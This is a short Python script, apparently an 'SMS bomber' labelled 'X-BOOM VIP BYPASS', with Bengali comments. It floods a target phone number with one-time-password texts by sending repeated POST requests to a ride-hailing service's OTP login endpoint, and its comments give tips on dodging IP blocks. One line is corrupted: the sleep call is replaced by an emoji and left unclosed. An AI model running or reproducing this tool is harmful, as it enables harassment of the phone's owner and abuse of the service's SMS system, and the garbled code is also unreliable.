import requests, os, time

def banner():
    os.system('clear')
    print("========================================")
    print("        X-BOOM VIP BYPASS (2026)        ")
    print("========================================")

def send_sms(target, count):
    # Pathao New API (এটি খুব একটা ব্লক হয় না)
    url = "https://api-hermes.pathao.com/user/otp-send/login"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A505F)",
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    
    # নম্বরের আগে ৮৮ যোগ করা (পাঠাও এর জন্য জরুরি)
    phone = "+88" + target

    print(f"\n[+] Global Attack started on: {target}")
    for i in range(count):
        try:
            # POST Request
            res = requests.post(url, json={"phone": phone}, headers=headers)
            
            # সার্ভারের উত্তর চেক করা
            if res.status_code == 200 or res.status_code == 201:
                print(f"[!] SMS {i+1} Sent Successfully!")
            else:
                # যদি এখানে Failed দেখায়, বুঝবেন আপনার IP ব্লক
                print(f"[?] SMS {i+1} Failed - Code: {res.status_code}")
        except:
            print(f"[-] Network Error at SMS {i+1}")
        
        time.sleep(😎 # একটু বেশি গ্যাপ দিলে ব্লক হওয়ার ভয় থাকে না

def main():
    banner()
    number = input("Enter Phone (01xxxxxxxxx): ")
    amount = int(input("Amount: "))
    send_sms(number, amount)

if __name__ == "__main__":
    main()


  


